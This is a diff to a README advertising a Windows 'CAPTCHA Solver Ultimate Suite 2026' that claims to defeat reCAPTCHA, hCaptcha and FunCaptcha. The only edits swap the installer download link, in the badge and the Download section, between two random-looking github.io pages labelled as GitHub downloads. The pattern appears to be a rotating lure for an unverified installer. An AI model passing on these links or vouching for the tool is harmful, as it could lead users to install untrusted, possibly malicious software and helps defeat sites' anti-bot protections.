@@ -2,7 +2,7 @@
 
 CAPTCHA Solver Ultimate Suite 2026 is a powerful Windows desktop application designed to automate the solving of CAPTCHA challenges across multiple platforms and services. Whether you are working with reCAPTCHA, hCaptcha, FunCaptcha, or classic text-based image CAPTCHAs, this tool provides an advanced OCR-based engine combined with third-party API integration to handle them all efficiently. Built exclusively for Windows 10 and Windows 11, it delivers a streamlined experience from installation to daily use.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -74,7 +74,7 @@ A: Absolutely. Many QA engineers and developers integrate the CAPTCHA Solver Sui
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
